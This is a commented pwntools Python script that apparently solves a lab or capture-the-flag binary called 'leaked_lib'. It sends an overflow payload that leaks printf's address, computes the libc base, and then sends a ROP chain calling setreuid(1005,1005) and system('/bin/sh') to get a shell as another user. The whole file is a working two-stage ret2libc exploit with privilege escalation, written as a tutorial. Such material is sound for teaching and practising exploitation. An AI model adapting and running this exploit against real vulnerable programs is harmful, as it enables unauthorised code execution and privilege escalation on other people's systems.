from pwn import *

# comment the one that we don't need
context.update(arch='i386', os='linux') # this is so pwntools knows we are working in x86
# context.update(arch='amd64', os='linux') # this is so pwntools knows we are working in x64

# useful locations
leaky = 0x80485b9
start = 0x8048566

# start the vuln program as a  process
p = process("./leaked_lib")

# attach process to gdb
#gdb.attach(p, '''
#echo "This is attached to gdb!"
#break main
#continue
#''')

# stack - this is where we can build our ROP exploit
payload = cyclic(cyclic_find("laaa")) # padding
payload += p32(leaky) # leak printf
payload += p32(start) # return to start to send 2nd exploit

# send payload
p.sendline(payload)

# getting printf
recv_data = p.recvuntil("leak!") # recv the data until the "leak!" string
printf_addr = recv_data[44:54] # partition the sting at the 0x12345678 address of printf

# getting the base of libc
libc = ELF("/lib/i386-linux-gnu/libc-2.27.so") # we load the path of libc here
printf_offset = libc.sym.printf # this will get us the offset from printf

libc_base = int(printf_addr, 16) - printf_offset # calculate the base of libc
print("address of libc:", hex(libc_base)) # print libc base to double check

libc.address = libc_base # this will set our libc base to the address we calculated
print("location of system:", hex(libc.sym.system)) # print the location of system to check

# building our rop chain
bin_sh = next(libc.search(b'/bin/sh')) # find the "/bin/sh" string address in libc
rop = ROP(libc) # start a rop chain
rop.setreuid(1005,1005) # set the real and effective uid to 1005 (leaky)
rop.system(bin_sh)  # call system with the location of /bin/sh
rop.exit(0) # call exit 0 to exit the shell cleanly

# second payload
payload2 = cyclic(cyclic_find("laaa")) # padding
payload2 += rop.chain() # jump to our rop chain
p.sendline(payload2) # send the second payload

p.interactive()